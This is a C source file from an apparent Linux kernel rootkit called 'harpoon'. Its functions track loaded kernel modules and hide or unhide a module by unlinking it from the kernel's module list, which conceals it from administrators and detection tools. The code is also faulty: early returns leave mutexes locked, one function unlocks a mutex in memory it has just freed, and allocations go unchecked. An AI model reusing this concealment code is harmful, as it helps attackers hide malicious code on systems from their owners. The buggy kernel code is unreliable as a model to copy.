#include <linux/slab.h>

#include "../global.h"
#include "module.h"

extern struct harpoon_struct *harpoon;

struct harpoon_module *harpoon_new_mod(struct module *module){
    struct harpoon_module *new_mod = kmalloc(sizeof(struct harpoon_module), GFP_KERNEL);
    new_mod->self = module;
    new_mod->prev = (struct module *)module->list.prev;
    new_mod->is_hidden = 0;
    mutex_init(&new_mod->lock);
    list_add(&new_mod->list, &harpoon->module_list);

    return new_mod;
}

void harpoon_del_mod(struct harpoon_module *module){
    mutex_lock(&module->lock);
    if(module->is_hidden && SAFEMODE){
        return;
    }
    list_del(&module->list);
    kfree(module);
    mutex_unlock(&module->lock);
}

void harpoon_mod_hide(struct harpoon_module *module){
    mutex_lock(&module->lock);
        if (module->is_hidden){
        return;
    }
    list_del(&module->self->list);
    module->is_hidden = 1;
    mutex_unlock(&module->lock);
}

void harpoon_mod_unhide(struct harpoon_module *module){
    mutex_lock(&module->lock);
    if (!module->is_hidden){
        return;
    }
    list_add(&module->self->list, &module->prev->list);
    module->is_hidden = 0;
    mutex_unlock(&module->lock);
}